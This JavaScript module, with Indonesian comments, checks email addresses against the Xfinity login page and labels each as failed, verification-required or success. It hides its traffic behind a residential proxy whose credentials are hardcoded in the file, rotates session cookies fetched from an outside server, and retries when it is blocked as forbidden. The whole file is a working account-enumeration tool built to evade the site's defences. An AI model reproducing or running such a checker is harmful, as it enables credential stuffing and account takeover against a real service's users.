const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// ANSI color codes
const colors = {
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    red: '\x1b[31m',
    reset: '\x1b[0m'
};

// Proxy konfigurasi
const proxyUrl = 'http://penta75-zone-resi-region-us:Casper7490@fe085722990a8b28.shg.na.pyproxy.io:16666';
const agent = new HttpsProxyAgent(proxyUrl);

// Daftar URL cookies
const cookieUrls = [
    'http://cookies.lintaskita.my.id/cookies1',
    'http://cookies.lintaskita.my.id/cookies2',
    'http://cookies.lintaskita.my.id/cookies3',
    'http://cookies.lintaskita.my.id/cookies4',
    'http://cookies.lintaskita.my.id/cookies5',
    'http://cookies.lintaskita.my.id/cookies6',
    'http://cookies.lintaskita.my.id/cookies7',
    'http://cookies.lintaskita.my.id/cookies8',
    'http://cookies.lintaskita.my.id/cookies9',
    'http://cookies.lintaskita.my.id/cookies0'
];

// Fungsi untuk memilih URL cookie secara acak
function getRandomCookieUrl() {
    const randomIndex = Math.floor(Math.random() * cookieUrls.length);
    return cookieUrls[randomIndex];
}

// Fungsi untuk mencoba permintaan dengan cookie URL baru jika "FORBIDDEN"
async function makeRequest(email) {
    const cookieUrl = getRandomCookieUrl();
    console.log(`${colors.green}[RANDOM]${colors.reset} ${cookieUrl}`);

    try {
        const cookieResponse = await axios.get(cookieUrl);
        const cookieValue = cookieResponse.data.trim();

        // Headers yang digunakan
        const headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8,ru;q=0.7,tr;q=0.6,ms;q=0.5,zh-CN;q=0.4,zh;q=0.3',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': cookieValue,
            'origin': 'https://login.xfinity.com',
            'priority': 'u=1, i',
            'referer': 'https://login.xfinity.com/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'if-modified-since': 'Wed, 12 Aug 2020 22:09:53 GMT',
            'if-none-match': '"c8afb92bc0d997ba5b673367e69b9ff1:1597270193.156081"'
        };

        const data = new URLSearchParams();
        data.append('user', email);

        const response = await axios.post('https://login.xfinity.com/login', data, {
            headers: headers,
            httpAgent: agent,
            httpsAgent: agent,
            maxRedirects: 3
        });

        const responseData = response.data;

        // Menentukan hasil berdasarkan isi respons
        if (responseData.includes("The Xfinity ID you entered was incorrect")) {
            return { status: "FAILED", email: email };
        } else if (responseData.includes("You don't have permission to access")) {
            console.log(`${colors.yellow}[FORBIDDEN]${colors.reset} ${email}`);
            return await makeRequest(email); // Panggil lagi dengan URL cookie yang berbeda
        } else if (responseData.includes("We emailed you a verification link that expires")) {
            return { status: "VERIFIKASI", email: email };
        } else {
            return { status: "SUCCESS", email: email };
        }
    } catch (error) {
        console.error(`${colors.red}[ERROR]${colors.reset} ${email}`, error.message);
        return { status: "ERROR", email: email, error: error.message };
    }
}

// Ekspor fungsi untuk digunakan di file utama
module.exports = { makeRequest };
